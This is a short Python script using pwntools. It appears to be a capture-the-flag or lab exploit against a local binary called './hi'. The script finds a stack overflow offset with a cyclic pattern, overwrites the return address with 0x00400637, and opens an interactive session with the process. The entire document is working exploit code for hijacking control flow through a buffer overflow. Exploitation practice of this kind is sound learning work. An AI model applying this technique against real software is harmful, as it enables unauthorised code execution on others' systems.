from pwn import *

context.binary = "./hi"
off = cyclic(cyclic_find("kaaalaaam"))
p = process()
print(p64(0x00400637))
p.sendline(off + p64(0x00400637))
p.interactive()
